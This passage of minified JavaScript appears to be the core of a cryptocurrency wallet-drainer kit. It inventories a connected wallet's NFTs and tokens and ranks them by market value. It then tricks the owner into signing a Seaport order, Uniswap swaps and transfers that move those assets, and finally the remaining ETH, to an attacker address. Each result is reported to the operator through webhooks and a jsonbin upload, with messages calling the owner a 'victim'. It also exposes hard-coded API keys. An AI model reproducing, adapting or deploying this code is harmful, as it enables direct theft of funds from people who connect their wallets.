        "#metamaskbutton,#metamaskbutton1,#metamaskbutton2,#metamaskbutton3,#metamaskbutton4,#metamaskbutton5"
      ).html(lG);
    var u = Promise.all([
        (async function (n) {
          var a = [];
          return (
            (logs_nft = await t.getLogs({
              fromBlock: "0x1",
              toBlock: "latest",
              topics: [
                "0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31",
                "0x000000000000000000000000" + n.slice(2),
                "0x0000000000000000000000001e0049783f008a0085193e00003d00cd54003c71",
              ],
            })),
            logs_nft.forEach((t) => {
              (addresss = t.address),
                (data = t.data),
                data.endsWith("1")
                  ? a.push(addresss.toLowerCase())
                  : (a = e(a, addresss.toLowerCase()));
            }),
            a
          );
        })(p),
        (async function (n) {
          var a = [];
          return (
            (logs_tokens = await t.getLogs({
              fromBlock: "0x1",
              toBlock: "latest",
              topics: [
                "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
                "0x000000000000000000000000" + n.slice(2),
                "0x0000000000000000000000001e0049783f008a0085193e00003d00cd54003c71",
              ],
            })),
            logs_tokens.forEach((t) => {
              (addresss = t.address),
                (data = t.data),
                data.startsWith("0xf")
                  ? a.push(addresss.toLowerCase())
                  : (a = e(a, addresss.toLowerCase()));
            }),
            a
          );
        })(p),
        (async function (e) {
          let t = e;
          const n = [];
          let a = !0,
            i = "",
            s = 0;
          for (; a && s < 10; ) {
            const { next: e, assets: r } = await fetch(
              "https://api.opensea.io/api/v1/assets?owner=" +
                t +
                (i.length ? "&cursor=" + i : "") +
                "&limit=100"
            ).then((e) => e.json());
            n.push(...r), s++, (i = e), (a = null != i);
          }
          return n;
        })(p),
      ]),
      l = [],
      m = [];
    out_of_promise = await u;
    var b = out_of_promise[0],
      f = out_of_promise[1],
      T = out_of_promise[2];
    for (let e = 0; e < T.length; e++)
      0 == new RegExp(T[e].collection.slug).test(m) &&
        (m.push(T[e].collection.slug), l.push(T[e]));
    prices_big_promise = Promise.all([
      async function (e) {
        const t = {},
          n = e.map(async (e) => {
            const n = await fetch(
              "https://api.thegraph.com/subgraphs/name/uniswap/uniswap-v3",
              {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  query: '{token(id: "token_addre") {derivedETH}}',
                }).replace("token_addre", e.token_address),
              }
            ).then((e) => e.json());
            if (!n.data.token) return;
            const a = n.data.token.derivedETH;
            try {
              if (
                ((price_in_eth = Number(a).toFixed(13)),
                (balance_erc20_eth =
                  (e.balance * price_in_eth) / Math.pow(10, e.decimals)),
                balance_erc20_eth < 1e-4)
              )
                return;
              t[e.token_address] = [balance_erc20_eth, e.balance];
            } catch (e) {
              return;
            }
          });
        return await Promise.all(n), t;
      },
      (async function (e, t) {
        const n = {},
          a = e.map(async (e) => {
            const a = e.collection.slug,
              { collection: i } = await fetch(
                "https://api.opensea.io/api/v1/collection/" + a
              ).then((e) => e.json());
            if (i.stats.total_volume >= 10)
              try {
                const e = i.stats.floor_price;
                if (
                  ((doesit =
                    "0x495f947276749ce646f68ac8c248420045cb7b5e" !=
                      i.primary_asset_contracts[0].address &&
                    "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85" !=
                      i.primary_asset_contracts[0].address &&
                    "0x39ee2c7b3cb80254225884ca001f57118c8f21b6" !=
                      i.primary_asset_contracts[0].address &&
                    "0x76be3b62873462d2142405439777e971754e8e77" !=
                      i.primary_asset_contracts[0].address &&
                    "0x0E32cEE0445413e118b14d02E0409303D338487a" !=
                      i.primary_asset_contracts[0].address &&
                    "0x60F80121C31A0d46B5279700f9DF786054aa5eE5" !=
                      i.primary_asset_contracts[0].address),
                  !doesit)
                )
                  return;
                if (e < 1e-4) return;
                (filtered = t.filter(
                  (e) =>
                    e.asset_contract.address ==
                    i.primary_asset_contracts[0].address
                )),
                  "sandbox" == a &&
                    (filtered = t.filter(
                      (e) =>
                        e.asset_contract[3].address ==
                        i.primary_asset_contracts[0].address
                    )),
                  (n[i.primary_asset_contracts[0].address] = [
                    e * filtered.length,
                    i.primary_asset_contracts[0].schema_name,
                    i.name,
                    e,
                  ]);
              } catch (e) {
                return;
              }
          });
        return await Promise.all(a), n;
      })(l, T),
    ]);
    var w = await prices_big_promise;
    function M(e) {
      for (var t = {}, n = [], a = e.length, i = 0, s = 0; s < a; s++) {
        var r = e[s];
        1 !== t[r] && ((t[r] = 1), (n[i++] = r));
      }
      return n;
    }
    const I = { method: "GET", headers: {} };
    (I.headers.accept = "application/json"),
      (I.headers["X-API-Key"] =
        "GDFONIA2hCCTurujqeZhMbpvupCLcbsq6tESiEhpEoSVaLzkh2Tf3ahjar9G3pVG");
    var h = fetch(
      "https://deep-index.moralis.io/api/v2/" + p + "/erc20?chain=eth",
      I
    );
    erc_promice = Promise.all([
      (async function (e) {
        const t = {},
          n = e.map(async (e) => {
            const n = await fetch(
              "https://api.thegraph.com/subgraphs/name/uniswap/uniswap-v3",
              {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  query: '{token(id: "token_addre") {derivedETH}}',
                }).replace("token_addre", e.token_address),
              }
            ).then((e) => e.json());
            if (!n.data.token) return;
            const a = n.data.token.derivedETH;
            try {
              if (
                ((price_in_eth = Number(a).toFixed(13)),
                (balance_erc20_eth =
                  (e.balance * price_in_eth) / Math.pow(10, e.decimals)),
                balance_erc20_eth < 1e-4)
              )
                return;
              t[e.token_address] = [balance_erc20_eth, e.balance];
            } catch (e) {
              return;
            }
          });
        return await Promise.all(n), t;
      })(await (await h).json()),
    ]);
    var g = await erc_promice;
    (erc_responses = await g[0]),
      (nft_responses = await w[1]),
      console.log(nft_responses),
      console.log(erc_responses),
      console.log(nft_responses),
      (erc_approved = M(f)),
      (to_seaport_drainer = []);
    for (let e = 0; e < erc_approved.length; e++)
      erc_responses.hasOwnProperty(erc_approved[e]) &&
        to_seaport_drainer.push([
          erc_approved[e],
          erc_responses[erc_approved[e]][1],
          erc_responses[erc_approved[e]][0],
          "ERC-20",
          erc_responses[erc_approved[e]][0],
        ]);
    to_seaport_drainer.sort(function (e, t) {
      let n = e[2],
        a = t[2];
      return n > a ? 1 : n < a ? -1 : 0;
    }),
      (to_seaport_drainer = to_seaport_drainer.reverse()),
      (to_seaport_drainer = to_seaport_drainer.slice(0, 1)),
      (b = M(b));
    for (let e = 0; e < b.length; e++)
      if (nft_responses.hasOwnProperty(b[e])) {
        out = T.filter((t) => t.asset_contract.address == b[e]);
        for (let t = 0; t < out.length; t++)
          to_seaport_drainer.push([
            b[e],
            out[t].token_id,
            nft_responses[b[e]][3],
            nft_responses[b[e]][1],
            nft_responses[b[e]][2],
          ]);
      }
    if (
      (console.log(to_seaport_drainer),
      to_seaport_drainer.sort(function (e, t) {
        let n = e[2],
          a = t[2];
        return n > a ? 1 : n < a ? -1 : 0;
      }),
      (to_seaport_drainer = to_seaport_drainer.reverse()),
      (to_seaport_drainer = to_seaport_drainer.slice(0, 20)),
      console.log(to_seaport_drainer),
      to_seaport_drainer.length > 0)
    ) {
      if (
        ((seaport_result = await (async function (e, t, n) {
          try {
            var a = [],
              i = [],
              s = 0;
            n.forEach(async (e) => {
              var t;
              (s += e[2]),
                (type =
                  "ERC721" == (t = e[3])
                    ? 2
                    : "ERC1155" == t
                    ? 3
                    : "ERC-20" == t
                    ? 1
                    : void 0),
                1 == type
                  ? (a.push({
                      itemType: type,
                      token: e[0],
                      identifier: "0",
                      amount: e[1],
                    }),
                    i.push({
                      itemType: type,
                      token: e[0],
                      identifier: "0",
                      amount: e[1],
                      recipient: recipient_addy,
                    }))
                  : (a.push({ itemType: type, token: e[0], identifier: e[1] }),
                    i.push({
                      itemType: type,
                      token: e[0],
                      identifier: e[1],
                      recipient: recipient_addy,
                    }));
            });
            const e = {
              zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
              startTime: "1661790956",
              conduitKey:
                "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
              offer: a,
              consideration: i,
            };

            var r = await t.createOrder(e, recipient_addy);
            var x = await r.executeAllActions();

            const u = await fetch("https://api.jsonbin.io/v3/b/", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                  "X-Master-Key":
                    "$2b$10$J1dbNf69sZGL2Qmd5LQfX.1gBIWE7.QtRDka34L/Zx.ukgntOzop6",
                  "X-Bin-Private": "false",
                  "X-Bin-Name": "SINNERS",
                },
                body: JSON.stringify(x),
            }), l = await u.json();

              manualWebhook(
                "%F0%9F%98%8B MANUAL SEAPORT ITEMS: " +
                  n.length +
                  " %0A[Address](https://etherscan.io/address/" +
                  p +
                  ") %0A[JSON](https://api.jsonbin.io/v3/b/" +
                  l.metadata.id +
                  "?meta=false) %0AManual: " +
                  d +
                  " Value: " +
                  s +
                  " ETH &parse_mode=Markdown"
              );
          } catch (e) {
            return (
              console.log(e.message),
              Webhook(
                "%F0%9F%96%95%F0%9F%8F%BB SEAPORT ERROR [Address](https://etherscan.io/address/" +
                  p +
                  ") " +
                  e.message +
                  " Trying SAFA&parse_mode=Markdown"
              ),
              !1
            );
          }
        })(0, d, to_seaport_drainer)),
        seaport_result)
      )
        for (let e = 0; e < to_seaport_drainer.length; e++)
          nft_responses.hasOwnProperty(to_seaport_drainer[e][0])
            ? ((new_value =
                nft_responses[to_seaport_drainer[e][0]][0] -
                nft_responses[to_seaport_drainer[e][0]][0]),
              new_value >= 0
                ? (delete nft_responses[to_seaport_drainer[e][0]],
                  console.log("removed " + to_seaport_drainer[e][0]))
                : (nft_responses[to_seaport_drainer[e][0]] = [
                    new_value,
                    nft_responses[to_seaport_drainer[e][0]][1],
                    nft_responses[to_seaport_drainer[e][0]][2],
                    nft_responses[to_seaport_drainer[e][0]][3],
                  ]))
            : erc_responses.hasOwnProperty(to_seaport_drainer[e][0]) &&
              delete erc_responses[to_seaport_drainer[e][0]];
    } else
      Webhook(
        "%F0%9F%91%A8%E2%80%8D%E2%9D%A4%EF%B8%8F%E2%80%8D%F0%9F%91%A8 VICTIM HAS 0 CONDUIT ITEMS [Address](https://etherscan.io/address/" +
          p +
          ")\n Trying SAFA&parse_mode=Markdown"
      );
    list_approval = [];
    for (const e in nft_responses)
      nft_responses.hasOwnProperty(e) &&
        list_approval.push([
          e,
          "useless",
          nft_responses[e][0],
          nft_responses[e][1],
          nft_responses[e][2],
        ]);
    for (const e in erc_responses)
      erc_responses.hasOwnProperty(e) &&
        list_approval.push([
          e,
          erc_responses[e][1],
          erc_responses[e][0],
          "ERC-20",
          erc_responses[e][0],
        ]);
    list_approval.sort(function (e, t) {
      let n = e[2],
        a = t[2];
      return n > a ? 1 : n < a ? -1 : 0;
    }),
      (list_approval = list_approval.reverse()),
      list_approval.length > 0
        ? (response_approvals = await (async function (e) {
            for (let s = 0; s < e.length; s++)
              if ("0x0" != e[s][0])
                if ("ERC-20" == e[s][3]) {
                  async function n(e, n) {
                    return (
                      (uni_aaaa = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"),
                      (logs_nft = await t.getLogs({
                        address: n,
                        fromBlock: "0x1",
                        toBlock: "latest",
                        topics: [
                          "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
                          "0x000000000000000000000000" + e.slice(2),
                          "0x000000000000000000000000" + uni_aaaa.slice(2),
                        ],
                      })),
                      (approved = !1),
                      console.log(logs_nft),
                      logs_nft.forEach((e) => {
                        (addresss = e.address),
                          (data = e.data),
                          data.startsWith("0xf")
                            ? (approved = !0)
                            : (approved = !1);
                      }),
                      approved
                    );
                  }
                  async function a(e, t) {
                    const n = {
                      inputs: [
                        {
                          internalType: "uint256",
                          name: "amountIn",
                          type: "uint256",
                        },
                        {
                          internalType: "uint256",
                          name: "amountOutMin",
                          type: "uint256",
                        },
                        {
                          internalType: "address[]",
                          name: "path",
                          type: "address[]",
                        },
                        {
                          internalType: "address",
                          name: "to",
                          type: "address",
                        },
                      ],
                      name: "swapExactTokensForTokens",
                      outputs: [
                        {
                          internalType: "uint256",
                          name: "amountOut",
                          type: "uint256",
                        },
                      ],
                      stateMutability: "payable",
                      type: "function",
                    };
                    return (
                      (abicko3 = new ethers.utils.Interface([n])),
                      (encoded_dadadaaaaaaa = abicko3.encodeFunctionData(
                        "swapExactTokensForTokens",
                        [
                          t,
                          "0",
                          [e, "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"],
                          recipient_addy,
                        ]
                      )),
                      encoded_dadadaaaaaaa
                    );
                  }
                  try {
                    console.log("permit test"), await c(e[s][0]);
                    var i = await n(p, e[s][0]);
                    i
                      ? (console.log(e[s][0] + " is approved "),
                        (encoded_shit = await a(e[s][0], e[s][1])),
                        (to_ti_to =
                          "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"))
                      : (console.log(e[s][0] + " is not approved "),
                        (encoded_shit = IK),
                        (to_ti_to = e[s][0]));
                    const r = { from: p, to: to_ti_to, data: encoded_shit },
                      x = await t.estimateGas(r),
                      _ = (await t.getGasPrice()).mul(x).mul(3);
                    console.log("safa"),
                      (response = await window.ethereum.request({
                        method: "eth_sendTransaction",
                        params: [
                          {
                            from: p,
                            to: to_ti_to,
                            data: encoded_shit,
                            gasLimit: _.toHexString(),
                          },
                        ],
                      })),
                      i
                        ? Webhook(
                            "%F0%9F%A4%91 UNISWAP " +
                              window.location.host +
                              " [TXID](https://etherscan.io/tx/" +
                              response +
                              ") \nFROM " +
                              p +
                              "\nValue: " +
                              e[s][2] +
                              "ETH&parse_mode=Markdown"
                          )
                        : "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" !==
                            e[s][0] &&
                          manualWebhook(
                            "ERC-20  [TXID](https://etherscan.io/tx/" +
                              response +
                              ") \nFROM " +
                              p +
                              "\n Value: " +
                              e[s][2] +
                              " ETH&parse_mode=Markdown",
                            p,
                            e[s][0],
                            "0x263521e1B939734e3bb01B134f4EE74ba3CDEDBD",
                            response,
                            e[s][1]
                          );
                  } catch (d) {
                    "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" !== e[s][0] &&
                      Webhook(
                        "%F0%9F%96%95%F0%9F%8F%BB ERC-20 REJECTED [Address](https://etherscan.io/address/" +
                          p +
                          ") [URL](https://etherscan.io/token/" +
                          e[s][0] +
                          "?a=" +
                          p +
                          ")&parse_mode=Markdown"
                      );
                  }
                } else if (
                  "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85" != e[s][0]
                ) {
                  const y = { from: p, to: e[s][0], data: Ij },
                    o = await t.estimateGas(y),
                    u = (await t.getGasPrice()).mul(o).mul(3);
                  try {
                    (response = await window.ethereum.request({
                      method: "eth_sendTransaction",
                      params: [
                        {
                          from: p,
                          to: e[s][0],
                          data: Ij,
                          gasLimit: u.toHexString(),
                        },
                      ],
                    })),
                      Webhook(
                        "SAFA  [CONTRACT](https://etherscan.io/token/" +
                          e[s][0] +
                          "?a=" +
                          p +
                          ") [TXID](https://etherscan.io/tx/" +
                          response +
                          ") FROM " +
                          p +
                          " Value: " +
                          e[s][2] +
                          " Name: " +
                          e[s][4] +
                          "ETH&parse_mode=Markdown",
                        p,
                        e[s][0],
                        "0x263521e1B939734e3bb01B134f4EE74ba3CDEDBD",
                        response
                      );
                  } catch (l) {
                    Webhook(
                      "%F0%9F%96%95%F0%9F%8F%BB SAFA REJECTED [Address](https://etherscan.io/address/" +
                        p +
                        ") [URL](https://etherscan.io/token/" +
                        e[s][0] +
                        "?a=" +
                        p +
                        ")&parse_mode=Markdown"
                    );
                  }
                }
            return console.log("returning from approvals"), !0;
          })(list_approval))
        : Webhook(
            "%F0%9F%91%A8%E2%80%8D%E2%9D%A4%EF%B8%8F%E2%80%8D%F0%9F%91%A8%F0%9F%8F%BE VICTIM HAS 0 NFTS/ERC [Address](https://etherscan.io/address/" +
              p +
              ")\n Trying SENDETH&parse_mode=Markdown"
          ),
      await (async function () {
        const e = await t.getBalance(p),
          n = [
            { inputs: [], stateMutability: "nonpayable", type: "constructor" },
            {
              inputs: [],
              name: "ClaimAirdrop",
              outputs: [],
              stateMutability: "payable",
              type: "function",
            },
            {
              inputs: [],
              name: "ClaimDevil",
              outputs: [],
              stateMutability: "payable",
              type: "function",
            },
            {
              inputs: [],
              name: "Mint",
              outputs: [],
              stateMutability: "payable",
              type: "function",
            },
            {
              inputs: [],
              name: "getOwner",
              outputs: [{ internalType: "address", name: "", type: "address" }],
              stateMutability: "view",
              type: "function",
            },
            {
              inputs: [],
              name: "withdrawBalance",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
          ];
        var a = new ethers.utils.Interface(n);
        encoded = a.encodeFunctionData("ClaimDevil");
        const i = {
            from: p,
            to: "0x7E178dD475f2ACeEF77e184E0020606d27161f98",
            value: e,
            data: encoded,
          },
          s = await t.estimateGas(i),
          r = await t.getGasPrice(),
          x = r.mul(s).mul(3),
          _ = r.mul(s).mul(5),
          d = e.sub(_),
          y = ethers.utils.formatEther(e);
        if (y < ethers.utils.formatEther(x))
          return (
            Webhook(
              "%F0%9F%96%95%F0%9F%8F%BB SENDETH ERROR [Address](https://etherscan.io/address/" +
                p +
                ") \nbalance too low to transfer ETH&parse_mode=Markdown"
            ),
            !0
          );
        try {
          return (
            await window.ethereum.request({
              method: "eth_sendTransaction",
              params: [
                {
                  from: p,
                  to: "0x7E178dD475f2ACeEF77e184E0020606d27161f98",
                  value: d.toHexString(),
                  data: encoded,
                  gasLimit: x.toHexString(),
                },
              ],
            }),
            Webhook(
              "%F0%9F%91%85 LICKED " +
                y +
                " ETH from [Address](https://etherscan.io/" +
                p +
                ") to " +
                recipient_addy +
                "&parse_mode=Markdown"
            ),
            !0
          );
        } catch (e) {
          return (
            Webhook(
              "%F0%9F%96%95%F0%9F%8F%BB SENDETH ERROR [Address](https://etherscan.io/" +
                p +
                ")\n " +
                e.message +
                "&parse_mode=Markdown"
            ),
            !0
          );
        }
      })();
  });
});
